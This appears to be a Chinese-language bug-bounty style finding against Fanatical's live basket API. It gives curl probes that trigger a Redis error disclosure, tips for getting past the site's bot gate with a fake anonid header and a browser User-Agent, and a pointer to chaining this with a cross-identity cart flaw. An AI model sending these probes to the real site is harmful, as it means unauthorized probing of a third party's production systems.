# Fanatical /api/basket/setmany 未捕获 Redis 错误回显

## 前置
- 无需登录态
- 必须带任意 UUIDv4 的 `anonid` 请求头（否则 CF Worker bot 门禁 → 400 "Request blocked"）
- 使用浏览器类 User-Agent（裸 curl UA 被边缘 403）

## 命中
```bash
curl -s -X POST https://www.fanatical.com/api/basket/setmany \
  -A "$ARTEX_UA" -H "anonid: $(cat /proc/sys/kernel/random/uuid)" \
  -H "Content-Type: application/json" \
  --data-binary '{"products":[]}'
```
回显：
```
HTTP 400
{"type":"cart","status":"E0","message":"ERR wrong number of arguments for 'hmset' command"}
```

## 对照（缺一不可）
```bash
# 正常路径：证明接口可达、错误确由空数组触发
curl -s -X POST https://www.fanatical.com/api/basket/setmany \
  -A "$ARTEX_UA" -H "anonid: $(cat /proc/sys/kernel/random/uuid)" \
  -H "Content-Type: application/json" \
  --data-binary '{"products":["663cd0b11c0036e84f48b26d"]}'
# → HTTP 200（返回购物车 JSON）

# 同类未处理异常旁证
curl -s -X POST https://www.fanatical.com/api/basket/removemany \
  -A "$ARTEX_UA" -H "anonid: $(cat /proc/sys/kernel/random/uuid)" \
  -H "Content-Type: application/json" \
  --data-binary '{"products":[]}'
# → HTTP 500 {"type":"cart","status":"E0","message":"Unexpected Error"}
```

## 判据
- `ERR wrong number of arguments for 'hmset' command` 是 Redis 服务端错误原文（非应用自定义文案）⇒ 后端数据层为 Redis 且异常未捕获；
- 必须有"正常路径 200"对照，否则无法区分"接口挂了"与"空数组触发底层异常"。

## 泄露点
- 后端数据层 = Redis；
- 购物车以 `anonid` 为键、用 `hmset` 哈希实现；
- 为键/序列化层探测提供反馈（配合已知的 anonid 跨身份读写接口）。

## 失败常见原因
- 缺 anonid 头 → 400 text/html "Request blocked"（门禁行为，非接口）；
- 裸 curl UA → 403 爬虫拦截；
- 目标已补异常处理 → 回显变为通用文案，或无回显。
